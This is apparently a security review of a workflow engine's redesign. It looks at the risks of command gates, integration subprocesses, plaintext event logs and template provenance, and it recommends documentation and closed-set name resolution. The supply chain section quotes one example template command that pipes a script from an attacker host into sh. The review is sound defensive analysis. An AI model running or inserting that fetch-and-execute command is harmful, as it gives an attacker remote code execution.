# Security Review: unified-koto-next

## Dimension Analysis

### Download Verification
**Applies:** No

The design does not introduce external downloads. Templates are local files committed to
the project repo or distributed via plugins that users explicitly install. The event-sourced
state file format is purely structural — no new download surfaces. SHA-256 hash verification
of templates already exists in the current implementation and the design preserves this
mechanism (the `template_hash` field moves into the JSONL header line).

### Execution Isolation
**Applies:** Yes — Critical

The design's `integration` feature invokes external processes via integration string tags.
This builds on the existing `command` gate feature, which already executes arbitrary shell
commands via `os/exec` (engine.go: `exec.CommandContext(ctx, "sh", "-c", gate.Command)`).

**Risks:**

- **Template-declared integrations:** Templates declare `integration: <string-tag>` on
  states. If integrations run subprocesses, a template author can inject arbitrary
  executable names, and the system invokes whatever the user has configured under those
  names. The design does not specify whether integration names are validated against a
  closed set.

- **Command gate expansion:** The new `when` conditions extend the surface where gate
  evaluation may chain with evidence submission. The current implementation already runs
  commands at gate evaluation time. If the new template format allows command gates in
  transition conditions, the attack surface grows.

- **Integration output in event log:** The `integration_invoked` event records integration
  output. If that output is later interpolated into directives (as the current controller
  does for evidence values), unsanitized subprocess output could inject content into
  directives displayed to agents.

**Mitigations:**

- Integration names must be resolved from a closed set (project configuration or plugin
  manifest), not from arbitrary template declarations.
- Integration output should be validated (size limits, schema) before storage and treated
  as untrusted if used in downstream interpolation contexts.
- Command gate `when` conditions should remain declarative (field equality) rather than
  allowing embedded shell commands.

### Supply Chain Risks
**Applies:** Yes — Moderate

Templates are the attack vector. If loaded from an untrusted source, `command` gates become
arbitrary code execution. The design does not reference the distribution model's security
implications.

**Risks:**

- **Template as code:** A template declaring `command: curl http://attacker.com/pwn.sh | sh`
  will execute it. The current implementation disables the gosec linter for this (`//nolint:gosec // G204`).
  This is intentional for trusted templates. The design doesn't address what happens if
  templates arrive from plugins that haven't been audited.

- **No gate visibility at load time:** The current pipeline compiles templates and caches
  them without displaying what commands will execute. Developers may not realize a plugin-
  provided template runs network commands.

**Mitigations:**

- Document that templates from external sources should be reviewed for command gates before
  use.
- Consider logging all command gates and integration invocations during `koto template compile`.
- The hash verification mechanism already prevents tampering with compiled templates; this
  is sufficient for the current distribution model.

### User Data Exposure
**Applies:** Yes — Moderate

The event log introduces two new plaintext persistence surfaces:

- **Evidence in events:** The `evidence_submitted` event stores agent-submitted key-value
  data as plain JSON. Evidence may include API keys, credentials, or sensitive analysis
  output. Event logs live in the project directory and are readable by anyone with
  filesystem access. The design does not address this.

- **Integration output in events:** The `integration_invoked` event records subprocess
  output. If an integration captures secrets, that output is persisted permanently in the
  event log. There are no size limits or redaction mechanisms specified.

**Mitigations:**

- Document that event logs may contain sensitive data and should be protected like `.env`
  files.
- Specify size limits on integration output to prevent log bloat.
- Consider an optional `sensitive: true` field on `accepts` fields that redacts values
  from event storage (stores presence but not content).

## Recommended Outcome

**OPTION 2 — Document considerations**

The event-sourced architecture is sound. No design changes are needed. The identified risks
(command execution via integrations, integration output interpolation, sensitive evidence
persistence) are manageable through implementation constraints and documentation. Recommended
Security Considerations section text is provided below.

## Recommended Security Considerations Text

### Command Gates and Integration Invocation

koto executes arbitrary shell commands via two mechanisms: command gates (evaluate exit codes
to allow transitions) and integration invocation (run user-configured subprocesses and record
output). Both are correct by design when template sources are trusted.

Templates come from two sources in koto's workflow:

- **Plugin-installed templates:** Reviewed as part of the plugin; installation requires
  explicit user action.
- **Project-scoped templates:** Committed to the project repository and reviewed via PR.

**Implementation constraint:** Integration names must resolve from a closed set (project
configuration or plugin manifest), not from arbitrary strings in template files. A template
declaring `integration: some-name` tells koto to route to the configured handler for
`some-name`; the actual command or process is defined in user or project configuration,
not in the template itself.

Command gates already enforce this implicitly: the command string is authored by the
developer who writes the template. If koto is extended to load templates from untrusted
sources, command gates require additional validation.

### Evidence Persistence

The event log persists evidence (agent-submitted data) and integration output as plaintext
JSON. Event logs may contain sensitive data submitted by agents — API keys, credentials,
or sensitive analysis output. Event log files should be protected like any file containing
secrets (e.g., `.env`). They are not suitable for committing to public repositories.

Integration output stored in `integration_invoked` events should be:

- Validated against size limits before storage to prevent log bloat
- Treated as untrusted if used in downstream interpolation contexts
- Subject to schema validation if the integration is expected to return structured data

### Template Hash Verification

The design retains SHA-256 hash verification of templates: the `template_hash` field in the
JSONL header ties the event log to the exact template version it was created with. Replaying
events against a modified template is detected and rejected. This is sufficient to prevent
tampered templates from being silently applied to existing workflows.

## Summary

No download or supply chain risks introduced directly by this design. Execution isolation
and user data exposure are the relevant dimensions: the `integration` feature can invoke
external processes (risk manageable via closed-set name resolution in config), and the event
log persists evidence as plaintext (risk manageable via documented handling practices).
Option 2: document considerations for implementers.
